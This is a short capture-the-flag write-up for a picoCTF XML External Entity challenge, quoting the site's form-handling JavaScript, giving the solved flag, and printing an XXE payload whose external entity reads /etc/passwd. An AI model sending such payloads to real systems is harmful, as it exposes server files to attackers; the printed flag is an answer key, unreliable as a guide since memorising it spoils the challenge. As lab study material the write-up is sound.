***Flag:***
<br>
picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}
<br>
***Approaching the challenge:***: <br>
The site we enter <br>
![{37163FCF-1B6B-457B-8B36-3848D3785DB4}](https://github.com/user-attachments/assets/616a10e3-689e-4ac6-9b7e-03d157cab049)
<br>
XXE was the hint which stands for XML External entity. To solidfy this hint, the source code had 2 more js files which had xml data on it. <br>
DetailsCheckPayload.js
```
window.contentType = 'application/xml';

function payload(data) {
    var xml = '<?xml version="1.0" encoding="UTF-8"?>';
    xml += '<data>';

    for(var pair of data.entries()) {
        var key = pair[0];
        var value = pair[1];

        xml += '<' + key + '>' + value + '</' + key + '>';
    }

    xml += '</data>';
    return xml;
}
```
and 
<br> detailscheck.js
```
document.querySelectorAll('.detailForm').forEach(item => {
    item.addEventListener("submit", function(e) {
        checkDetails(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
        e.preventDefault();
    });
});
function checkDetails(method, path, data) {
    const retry = (tries) => tries == 0
        ? null
        : fetch(
            path,
            {
                method,
                headers: { 'Content-Type': window.contentType },
                body: payload(data)
            }
          )
            .then(res => res.status == 200
                ? res.text().then(t => t)
                : "Could not find the details. Better luck next time :("
            )
            .then(res => document.getElementById("detailsResult").innerHTML = res)
            .catch(e => retry(tries - 1));

    retry(3);
}
```
Hence we conclude that it's XXE. <br>
The source I used basically sent request of the flag with our payload. AI explained how by c reating a custom XXE payload to read a file involves exploiting a vulnerable XML p by injecting an external entity that points to the desired file. Since we need to read the /etc/passwd file it strongly suggested to use this. So I asked AI to write a custom payload(below) on the request and it resulted in the flag.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>
  <ID>&file;</ID>
</data>
```

After forwarding I finally found the flag:
<br>
![{36C50246-BA17-4DE1-AB71-BCDB6BB0949B}](https://github.com/user-attachments/assets/681c2dc6-753e-4928-8cde-f9ad1f111f6f)


Source/guide: https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Web%20Exploitation/SOAP/SOAP.md
